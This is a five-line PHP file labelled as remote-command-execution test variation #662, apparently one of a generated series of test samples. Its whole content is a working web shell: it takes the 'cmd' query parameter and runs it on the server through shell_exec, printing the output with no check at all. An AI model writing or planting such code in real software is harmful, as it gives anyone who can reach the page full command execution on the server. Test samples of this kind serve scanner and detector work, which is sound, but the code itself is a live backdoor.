<?php
// RCE test variation #662
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>